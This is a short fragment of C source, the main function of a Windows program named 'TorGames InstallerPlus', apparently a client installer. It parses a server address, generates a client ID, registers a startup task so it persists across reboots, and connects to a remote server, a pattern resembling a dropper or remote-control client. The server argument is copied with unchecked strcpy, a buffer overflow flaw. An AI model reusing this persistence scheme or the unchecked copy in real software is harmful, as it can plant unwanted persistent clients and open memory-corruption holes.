    // Parse args
    for (int i = 1; i < argc; i++) {
        if ((strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--server") == 0) && i + 1 < argc) {
            char* colon = strchr(argv[++i], ':');
            if (colon) {
                *colon = '\0';
                strcpy(g_serverHost, argv[i]);
                g_serverPort = atoi(colon + 1);
            } else {
                strcpy(g_serverHost, argv[i]);
            }
        }
    }

    // Initialize
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    // Generate client ID
    GenerateClientId(g_clientId);
    Log("Client ID: %s", g_clientId);
    Log("Server: %s:%d", g_serverHost, g_serverPort);

    // Create startup task for installer to persist across reboots
    // This ensures the installer runs on boot until the client is installed
    CreateInstallerStartupTask();

    printf("TorGames InstallerPlus (Lightweight)\n");
    printf("Press Ctrl+C to exit\n\n");

    // Run
    RunClient();

    // Cleanup
    WSACleanup();
    CoUninitialize();
    Log("Stopped");
    return 0;
}
